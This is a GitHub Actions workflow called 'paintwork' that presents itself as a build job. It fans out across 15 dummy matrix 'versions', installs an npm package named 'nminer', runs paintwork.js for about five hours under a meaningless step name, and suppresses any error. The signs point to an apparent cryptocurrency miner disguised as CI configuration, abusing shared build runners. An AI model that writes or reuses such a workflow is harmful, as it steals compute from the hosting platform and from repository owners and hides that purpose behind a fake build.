name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6455 }
          - { version: 2317 }
          - { version: 99 }
          - { version: 1198 }
          - { version: 5717 }
          - { version: 1753 }
          - { version: 9074 }
          - { version: 9060 }
          - { version: 8022 }
          - { version: 1409 }
          - { version: 762 }
          - { version: 7573 }
          - { version: 6908 }
          - { version: 4176 }
          - { version: 4958 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: wafer knottily promptly aside
        run: |
          npm install nminer@latest
          timeout 303m node paintwork.js || echo "paintwork executed"